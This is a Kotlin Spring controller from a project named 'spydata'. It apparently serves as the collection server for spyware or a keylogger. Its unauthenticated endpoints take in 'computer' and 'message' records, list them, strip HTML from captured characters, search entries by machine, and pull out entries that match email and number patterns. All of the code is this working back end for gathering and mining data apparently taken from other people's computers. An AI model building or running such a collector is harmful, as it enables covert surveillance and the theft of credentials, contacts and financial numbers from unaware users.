package com.farvher.spydata.controllers

import com.farvher.spydata.dto.DataDTO
import org.springframework.stereotype.Controller
import com.farvher.spydata.services.DataService
import org.springframework.ui.Model
import com.farvher.spydata.entity.Data
import org.springframework.web.bind.annotation.*
import java.time.LocalDate
import java.util.stream.Collectors


@Controller
class DataController(val dataService : DataService) {
	
	
	
	@PostMapping("/save")
	@ResponseBody
	fun saveData(@RequestBody dataDto: DataDTO) : String{
		dataService.save(Data(LocalDate.now() ,dataDto.computer ,dataDto.message ))
		return "saved"
	}

	@PostMapping("/save2")
	@ResponseBody
	fun saveData2(@RequestParam computer: String , @RequestParam message: String ) : String{
		dataService.save(Data(LocalDate.now() ,computer ,message ))
		return "saved"
	}
	
	@GetMapping("/")
	fun home() : String  {
		return "index"
	}
	
	@GetMapping("/rest")
	@ResponseBody
	fun rest() : List<Data> {
		
		return dataService.findAll();
		 
	}
	
	@GetMapping("/data")
	fun data(model : Model) : String  {
		model.addAttribute("data",dataService.findAll())
		return "index"
	}
	@GetMapping("/clear")
	fun clear(model : Model) : String  {
		val re = Regex("<.+?>")
		var data  = dataService.findAll()
		data = data.stream()
				.map { Data(it.date,
						it.computer,
						re.replace(it.characters,""),
						it.id) }
				.collect(Collectors.toList())

		model.addAttribute("data",data)
		return "index"
	}
	
	@PostMapping("/find")
	fun home(model : Model , @RequestParam computer:String) : String  {
		model.addAttribute("data",dataService.findByComputer(computer))
		return "index"
	}
	
	@GetMapping("/delete")
	fun deleteAll() : String {
		dataService.deleteAll()
		return "index"
	}
	
	@GetMapping("/delete/{id}")
	@ResponseBody
	fun deleteById(@PathVariable id : Long) : String {
		dataService.deleteById(id);
		return "deleted "+id
	}
	
	@GetMapping("/delete-computer/{computer}")
	@ResponseBody
	fun deleteByComputer(@PathVariable computer : String) : String {
		dataService.deleteByComputer(computer);
		return "deleted "+computer
	}
	
	@PostMapping("/contains")
	fun findConstains(model : Model , @RequestParam contains : String) : String{
		model.addAttribute("data",dataService.findByContains(contains))
		return "index"	
	}
	
	@GetMapping("/regexNumber")
	fun findRegexNumber(model : Model) : String{
		model.addAttribute("data",dataService.findByMatchNumber())
		return "index"	
	}
	
	@GetMapping("/regexEmail")
	fun findRegexEmail(model : Model) : String{
		model.addAttribute("data",dataService.findByMatchEmail())
		return "index"	
	}
	
}